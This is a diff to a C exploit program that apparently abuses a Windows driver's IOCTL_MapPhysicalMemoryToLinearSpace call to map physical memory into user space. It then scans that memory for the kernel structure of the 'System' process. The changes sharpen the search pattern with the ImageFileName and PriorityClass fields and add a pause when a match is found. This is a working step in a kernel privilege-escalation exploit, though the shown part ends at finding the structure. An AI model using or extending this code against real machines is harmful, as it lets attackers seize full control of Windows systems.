@@ -40,7 +40,7 @@ int main(char argc, char** argv)
 		fprintf(stderr, "[!] GetPhysicalMemoryLayout() failed.\n");
 		return -1;
 	}
-	
+
 	printf("physical memory regions\n");
 	for (int i = 0; i < memRegionsCount; i++) {
 		printf("%p - %p\n", (void*)memRegion[i].address, (void*)(memRegion[i].address + memRegion[i].size));
@@ -59,7 +59,7 @@ int main(char argc, char** argv)
 		return FALSE;
 	}
 	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
-	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, hPhysicalMemory, sizeof(hPhysicalMemory), 
+	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, hPhysicalMemory, sizeof(hPhysicalMemory),
 		hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
 	if (status == FALSE) {
 		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
@@ -67,16 +67,18 @@ int main(char argc, char** argv)
 	}
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("Handle for PhysicalMemory: 0x%p\n", hPhysicalMemory);
-	
+
 	PVOID* buf = (PVOID*)malloc(0x1000);
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
 
-	//random pattern
-	unsigned char patt[] = {
-		"System\0\0\0\0\0\0\0\0\0"
+	//UCHAR ImageFileName[15];
+	unsigned char patt[16] = {
+		"System\0\0\0\0\0\0\0\0\0",
 	};
+	//UCHAR PriorityClass;
+	patt[15] = 0x02;
 
 	// go through mapped physical memory regions
 	for (int i = 5; i < memRegionsCount; i++) {
@@ -98,6 +100,7 @@ int main(char argc, char** argv)
 				if (memcmp(castedBuf, patt, sizeof(patt)) == 0)
 				{
 					printf("\nFound pattern at: %p\n", (void*)(buf + offset));
+					system("pause");
 				}
 			}
 			if (UnmapPhysicalMemory(buf) == FALSE) {
